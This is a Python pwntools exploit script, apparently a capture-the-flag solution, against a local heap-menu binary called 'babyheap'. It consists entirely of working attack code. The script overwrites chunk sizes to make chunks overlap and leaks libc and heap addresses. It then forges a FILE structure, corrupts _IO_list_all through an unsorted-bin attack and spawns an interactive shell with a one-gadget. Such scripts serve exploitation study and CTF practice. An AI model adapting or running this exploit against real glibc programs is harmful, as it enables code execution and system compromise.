from pwn import *

r = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def alloc(size):
    r.sendlineafter('Command: ', '1')
    r.sendlineafter('Size: ', str(size))
def update(idx, content, size=0):
    r.sendlineafter('Command: ', '2')
    r.sendlineafter('Index: ', str(idx))
    if size:
        r.sendlineafter('Size: ', str(size))
    else:
        r.sendlineafter('Size: ', str(len(content)))
    r.sendlineafter('Content: ', content)
def delete(idx):
    r.sendlineafter('Command: ', '3')
    r.sendlineafter('Index: ', str(idx))
def view(idx):
    r.sendlineafter('Command: ', '4')
    r.sendlineafter('Index: ', str(idx))

alloc(0x18)#0
alloc(0x28)#1
alloc(0x58)#2
alloc(0x18)#3
alloc(0x28)#4
alloc(0x58)#5
alloc(0x18)#6

update(0, 'A'*0x18+'\x91')
delete(1)
alloc(0x28)#1
view(2)
r.recvuntil('Chunk[2]: ')
libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['__malloc_hook'] - 0x68
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
unsorted_bin = libc_base + libc.symbols['__malloc_hook'] + 0x68
magic = libc_base + 0xf1147
log.info('libc base: %#x' % libc_base)

log.info('_IO_list_all: %#x' % _IO_list_all)

# restore to initial state
alloc(0x58)#7 -- 7 and 2 are the same

delete(5)
delete(7)
view(2)
r.recvuntil('Chunk[2]: ')
heap_base = u64(r.recv(6)+'\x00\x00') - 0x100
log.info('heap base: %#x' % heap_base)

# restore
alloc(0x58)
alloc(0x58)

# prepare fake file structure
update(3, '\x00'*0x18+'\x91')
delete(4)
alloc(0x58)#4
alloc(0x18)
alloc(0x58)
update(1, '\x00'*0x20+'/bin/sh\x00')
update(4, '\x00'*0x10+p64(heap_base+0x1a0)+'\x00'*0x18+p64(1)+p64(0)*2+p64(heap_base+0x180))
update(9, p64(magic)*2+p64(0)*4+p64(1)+p64(2))


# trigger exploit
update(0, 'A'*0x18+'\x91')
delete(1)
alloc(0x28)
update(2, p64(unsorted_bin)+p64(_IO_list_all-0x10))

alloc(0x18)
r.clean()
r.interactive()
